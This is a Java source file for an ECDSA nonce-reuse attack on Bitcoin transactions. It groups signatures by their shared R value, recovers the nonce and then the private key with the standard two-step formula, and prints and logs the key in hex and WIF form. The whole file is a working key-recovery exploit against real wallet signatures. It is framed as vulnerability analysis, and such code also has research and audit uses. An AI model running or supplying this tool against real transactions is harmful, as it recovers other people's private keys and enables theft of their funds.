import java.math.BigInteger;
import java.util.*;

/**
 * Main class for ECDSA nonce reuse attack implementation
 * Implements the two-step algorithm for private key recovery
 */
public class ECDSAAttack {
    
    // secp256k1 curve order
    public static final BigInteger CURVE_ORDER = new BigInteger("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16);
    
    private VulnerabilityDetector detector;
    private WIFConverter wifConverter;
    
    public ECDSAAttack() {
        this.detector = new VulnerabilityDetector();
        this.wifConverter = new WIFConverter();
    }
    
    /**
     * Analyzes a Bitcoin transaction for ECDSA nonce reuse vulnerabilities
     * @param transaction The transaction to analyze
     * @return AttackResult containing the analysis results
     */
    public AttackResult analyzeTransaction(BitcoinTransaction transaction) {
        System.out.println("Starting vulnerability analysis for transaction: " + transaction.getTransactionId());
        System.out.println("Number of inputs: " + transaction.getSignatures().size());
        
        // Group signatures by R value
        Map<BigInteger, List<TransactionSignature>> rGroups = detector.groupSignaturesByR(transaction.getSignatures());
        
        AttackResult result = new AttackResult();
        result.setTransactionId(transaction.getTransactionId());
        result.setTotalSignatures(transaction.getSignatures().size());
        
        // Check for R value reuse
        List<BigInteger> reusedRValues = rGroups.entrySet().stream()
            .filter(entry -> entry.getValue().size() > 1)
            .map(Map.Entry::getKey)
            .collect(ArrayList::new, ArrayList::add, ArrayList::addAll);
        
        if (reusedRValues.isEmpty()) {
            System.out.println("No R value reuse detected - transaction appears secure");
            result.setVulnerable(false);
            return result;
        }
        
        System.out.println("Vulnerability detected! Found " + reusedRValues.size() + " reused R value(s)");
        result.setVulnerable(true);
        result.setReusedRValues(reusedRValues);
        
        // Attempt private key recovery for each reused R value
        for (BigInteger rValue : reusedRValues) {
            List<TransactionSignature> signatures = rGroups.get(rValue);
            System.out.println("Processing R value: " + rValue.toString(16) + " (used in " + signatures.size() + " signatures)");
            
            // Try all pairs within this R group
            for (int i = 0; i < signatures.size(); i++) {
                for (int j = i + 1; j < signatures.size(); j++) {
                    TransactionSignature sig1 = signatures.get(i);
                    TransactionSignature sig2 = signatures.get(j);
                    
                    System.out.println("Attempting key recovery for signature pair (" + (i+1) + ", " + (j+1) + ")");
                    
                    try {
                        PrivateKeyRecoveryResult recoveryResult = recoverPrivateKey(sig1, sig2, rValue);
                        if (recoveryResult.isSuccess()) {
                            result.addRecoveredKey(recoveryResult);
                            System.out.println("Private key successfully recovered!");
                            System.out.println("Private key (decimal): " + recoveryResult.getPrivateKey());
                            System.out.println("Private key (hex): " + recoveryResult.getPrivateKey().toString(16));
                            
                            // Generate WIF formats
                            String wifCompressed = wifConverter.toWIF(recoveryResult.getPrivateKey(), true);
                            String wifUncompressed = wifConverter.toWIF(recoveryResult.getPrivateKey(), false);
                            
                            recoveryResult.setWifCompressed(wifCompressed);
                            recoveryResult.setWifUncompressed(wifUncompressed);
                            
                            System.out.println("WIF (compressed): " + wifCompressed);
                            System.out.println("WIF (uncompressed): " + wifUncompressed);
                            
                            // Log the recovery result
                            ResultLogger.logDetailedResult(
                                transaction.getTransactionId(),
                                transaction.getTransactionId(), 
                                recoveryResult.getPrivateKey(),
                                wifCompressed,
                                wifUncompressed,
                                rValue,
                                true
                            );
                            
                            return result; // Found a valid key, stop processing
                        } else {
                            System.out.println("Key recovery failed: " + recoveryResult.getErrorMessage());
                        }
                    } catch (Exception e) {
                        System.out.println("Error in key recovery: " + e.getMessage());
                    }
                }
            }
        }
        
        System.out.println("Vulnerability analysis completed");
        return result;
    }
    
    /**
     * Recovers the private key using the two-step algorithm
     * @param sig1 First signature with reused nonce
     * @param sig2 Second signature with reused nonce
     * @param rValue The reused R value
     * @return PrivateKeyRecoveryResult containing the recovered key or error information
     */
    public PrivateKeyRecoveryResult recoverPrivateKey(TransactionSignature sig1, TransactionSignature sig2, BigInteger rValue) {
        try {
            System.out.println("Using curve order n = " + CURVE_ORDER.toString(16));
            System.out.println("R value: " + rValue.toString(16));
            
            BigInteger r = rValue;
            BigInteger s1 = sig1.getS();
            BigInteger s2 = sig2.getS();
            BigInteger m1 = sig1.getMessageHash();
            BigInteger m2 = sig2.getMessageHash();
            
            // Validate inputs
            if (s1.equals(s2)) {
                return new PrivateKeyRecoveryResult(false, "Invalid signatures: s1 equals s2", null, null);
            }
            
            if (r.equals(BigInteger.ZERO)) {
                return new PrivateKeyRecoveryResult(false, "Invalid signature: r equals zero", null, null);
            }
            
            // Step 1: Recover nonce k = (m1-m2)/(s1-s2) mod n
            BigInteger numerator = m1.subtract(m2).mod(CURVE_ORDER);
            BigInteger denominator = s1.subtract(s2).mod(CURVE_ORDER);
            
            if (denominator.equals(BigInteger.ZERO)) {
                return new PrivateKeyRecoveryResult(false, "Invalid signatures: s1-s2 equals zero", null, null);
            }
            
            BigInteger denominatorInv = denominator.modInverse(CURVE_ORDER);
            BigInteger k = numerator.multiply(denominatorInv).mod(CURVE_ORDER);
            
            System.out.println("Step 1 - Recovered nonce k: " + k.toString(16));
            
            // Step 2: Recover private key d = (s1*k-m1)/r mod n
            BigInteger numerator2 = s1.multiply(k).subtract(m1).mod(CURVE_ORDER);
            BigInteger rInv = r.modInverse(CURVE_ORDER);
            BigInteger privateKey = numerator2.multiply(rInv).mod(CURVE_ORDER);
            
            System.out.println("Step 2 - Recovered private key: " + privateKey.toString(16));
            
            // Verify the private key is not zero
            if (privateKey.equals(BigInteger.ZERO)) {
                return new PrivateKeyRecoveryResult(false, "Recovered private key is zero", null, null);
            }
            
            return new PrivateKeyRecoveryResult(true, null, privateKey, k);
            
        } catch (ArithmeticException e) {
            return new PrivateKeyRecoveryResult(false, "Arithmetic error: " + e.getMessage(), null, null);
        } catch (Exception e) {
            return new PrivateKeyRecoveryResult(false, "Unexpected error: " + e.getMessage(), null, null);
        }
    }
    
    /**
     * Validates that two signatures share the same R value
     * @param sig1 First signature
     * @param sig2 Second signature
     * @return true if R values match, false otherwise
     */
    public boolean validateSameR(TransactionSignature sig1, TransactionSignature sig2) {
        return sig1.getR().equals(sig2.getR());
    }
    
    /**
     * Result class for attack analysis
     */
    public static class AttackResult {
        private String transactionId;
        private boolean vulnerable;
        private int totalSignatures;
        private List<BigInteger> reusedRValues;
        private List<PrivateKeyRecoveryResult> recoveredKeys;
        
        public AttackResult() {
            this.reusedRValues = new ArrayList<>();
            this.recoveredKeys = new ArrayList<>();
        }
        
        // Getters and setters
        public String getTransactionId() { return transactionId; }
        public void setTransactionId(String transactionId) { this.transactionId = transactionId; }
        
        public boolean isVulnerable() { return vulnerable; }
        public void setVulnerable(boolean vulnerable) { this.vulnerable = vulnerable; }
        
        public int getTotalSignatures() { return totalSignatures; }
        public void setTotalSignatures(int totalSignatures) { this.totalSignatures = totalSignatures; }
        
        public List<BigInteger> getReusedRValues() { return reusedRValues; }
        public void setReusedRValues(List<BigInteger> reusedRValues) { this.reusedRValues = reusedRValues; }
        
        public List<PrivateKeyRecoveryResult> getRecoveredKeys() { return recoveredKeys; }
        public void addRecoveredKey(PrivateKeyRecoveryResult key) { this.recoveredKeys.add(key); }
    }
    
    /**
     * Result class for private key recovery
     */
    public static class PrivateKeyRecoveryResult {
        private boolean success;
        private String errorMessage;
        private BigInteger privateKey;
        private BigInteger nonce;
        private String wifCompressed;
        private String wifUncompressed;
        
        public PrivateKeyRecoveryResult(boolean success, String errorMessage, BigInteger privateKey, BigInteger nonce) {
            this.success = success;
            this.errorMessage = errorMessage;
            this.privateKey = privateKey;
            this.nonce = nonce;
        }
        
        // Getters and setters
        public boolean isSuccess() { return success; }
        public String getErrorMessage() { return errorMessage; }
        public BigInteger getPrivateKey() { return privateKey; }
        public BigInteger getNonce() { return nonce; }
        public String getWifCompressed() { return wifCompressed; }
        public void setWifCompressed(String wifCompressed) { this.wifCompressed = wifCompressed; }
        public String getWifUncompressed() { return wifUncompressed; }
        public void setWifUncompressed(String wifUncompressed) { this.wifUncompressed = wifUncompressed; }
    }
}
